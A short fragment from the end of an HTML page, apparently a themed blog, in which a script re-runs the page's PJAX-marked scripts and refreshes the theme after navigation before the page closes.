            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
